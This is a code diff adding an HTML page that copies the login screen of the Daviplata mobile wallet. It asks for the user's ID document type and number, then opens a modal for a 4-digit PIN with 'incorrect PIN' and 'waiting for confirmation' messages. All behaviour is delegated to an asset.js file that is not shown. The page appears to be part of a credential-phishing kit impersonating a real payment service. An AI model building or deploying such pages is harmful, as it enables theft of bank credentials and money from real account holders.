@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
+    <meta name="theme-color" content="#0a0a0a">
+    <title>Daviplata - Iniciar sesión</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <div class="fondo"></div>
+    <div class="overlay"></div>
+
+    <main class="pantalla">
+
+        <header class="marca">
+            <img src="daviplata.png" alt="" width="350">
+        </header>
+
+        <form id="formLogin" class="formulario" novalidate autocomplete="off">
+
+            <div class="campo">
+                <select id="tipoDoc" aria-label="Tipo de documento">
+                    <option value="CC" selected>Cédula de ciudadanía</option>
+                    <option value="CE">Cédula de extranjería</option>
+                    <option value="PA">Pasaporte</option>
+                    <option value="TI">Tarjeta de identidad</option>
+                </select>
+                <svg class="chevron" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ffffff"
+                    stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="6 9 12 15 18 9"></polyline>
+                </svg>
+            </div>
+
+            <div class="campo">
+                <input id="numDoc" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="12"
+                    placeholder="Número de documento" enterkeyhint="go" spellcheck="false" autocomplete="off">
+            </div>
+
+            <div class="checks">
+                <label class="check">
+                    <input type="checkbox" id="recordar">
+                    <span class="caja"></span>
+                    <span class="texto">Recordar datos</span>
+                </label>
+                <label class="check faceid">
+                    <input type="checkbox" id="faceId">
+                    <span class="caja"></span>
+                    <span class="texto">Ingresar con Face ID</span>
+                </label>
+            </div>
+
+            <a class="olvido" href="#">¿Olvidó su clave?</a>
+
+            <button type="submit" id="btnContinuar" class="btn-continuar" disabled>Continuar</button>
+
+        </form>
+
+        <div class="barra-inferior">
+            <button type="button" class="accion" data-accion="comprar">Comprar</button>
+            <div class="qr-wrap">
+                <button type="button" class="qr" id="btnQr" aria-label="Escanear código QR">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="3" y="3" width="7" height="7"></rect>
+                        <rect x="14" y="3" width="7" height="7"></rect>
+                        <rect x="3" y="14" width="7" height="7"></rect>
+                        <line x1="14" y1="14" x2="14" y2="17"></line>
+                        <line x1="14" y1="20" x2="17" y2="20"></line>
+                        <line x1="20" y1="14" x2="20" y2="17"></line>
+                        <line x1="17" y1="17" x2="20" y2="17"></line>
+                    </svg>
+                </button>
+            </div>
+            <button type="button" class="accion" data-accion="vender">Vender</button>
+        </div>
+
+        <div class="home-indicator"></div>
+
+    </main>
+<div id="modalClave" class="modal" aria-hidden="true">
+    <div class="modal-card">
+        <div class="modal-head">
+            <h3>Ingresa tu clave</h3>
+            <button type="button" id="cerrarClave" class="modal-x" aria-label="Cerrar">✕</button>
+        </div>
+        <div class="modal-body">
+            <p class="modal-sub">Clave de 4 dígitos</p>
+            <div class="clave-cajas" id="claveCajas">
+                <input class="clave-box" type="tel" inputmode="numeric" maxlength="1" autocomplete="off">
+                <input class="clave-box" type="tel" inputmode="numeric" maxlength="1" autocomplete="off">
+                <input class="clave-box" type="tel" inputmode="numeric" maxlength="1" autocomplete="off">
+                <input class="clave-box" type="tel" inputmode="numeric" maxlength="1" autocomplete="off">
+            </div>
+            <p class="modal-error" id="claveError">Clave incorrecta. Intenta de nuevo.</p>
+            <p class="modal-espera" id="claveEspera">Esperando confirmación...</p>
+        </div>
+        <div class="modal-foot">
+            <button type="button" id="btnConfirmarClave" class="btn-confirmar" disabled>Confirmar</button>
+        </div>
+    </div>
+</div>
+    <div id="loader" class="loader">
+        <div class="spinner"></div>
+    </div>
+
+    <script src="asset.js"></script>
+</body>
+
+</html>
